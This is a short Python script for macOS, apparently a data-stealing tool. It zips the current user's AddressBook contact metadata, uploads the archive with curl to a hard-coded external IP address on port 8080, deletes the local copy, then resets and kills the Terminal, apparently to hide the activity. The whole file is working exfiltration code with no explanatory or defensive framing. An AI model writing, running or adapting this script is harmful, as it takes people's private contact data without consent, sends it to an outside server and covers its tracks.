#!/usr/bin/env python
import os
import shutil
import getpass
from os.path import expanduser
import subprocess
from time import sleep

home = expanduser("~")

clocation = home + "/Library/Application Support/AddressBook/Metadata/"

uploadlink = "http://146.148.56.181:8080/"

user = getpass.getuser()

zipname = "./{0}".format(user)

shutil.make_archive(zipname, 'zip', clocation)

subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
# This is not a good way to handle this but works for now
sleep(1)
os.unlink(zipname + ".zip")

subprocess.call(['tput', 'reset'])
subprocess.call(['killall', 'Terminal'])
